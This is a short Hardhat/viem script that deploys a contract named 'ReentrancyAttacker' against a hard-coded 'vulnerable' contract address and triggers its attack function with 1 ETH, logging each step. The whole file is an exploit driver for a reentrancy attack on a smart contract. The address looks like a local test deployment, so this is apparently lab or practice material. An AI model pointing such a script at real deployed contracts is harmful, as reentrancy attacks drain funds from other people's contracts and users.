import hre from "hardhat";

async function main() {

  const { viem } = await hre.network.connect();

 const vulnerableAddress = "0x0165878a594ca255338adfa4d48449f69242eb8f";

  const walletClient = await viem.getWalletClient();
  const [account] = await walletClient.getAddresses();

  const attacker = await viem.deployContract(
    "ReentrancyAttacker",
    [vulnerableAddress]
  );

  console.log("Attacker deployed:", attacker.address);

  console.log("Starting attack...");

  await walletClient.writeContract({
    address: attacker.address,
    abi: attacker.abi,
    functionName: "attack",
    account: account,
    value: 1000000000000000000n
  });

  console.log("Attack executed");

}

main().catch(console.error);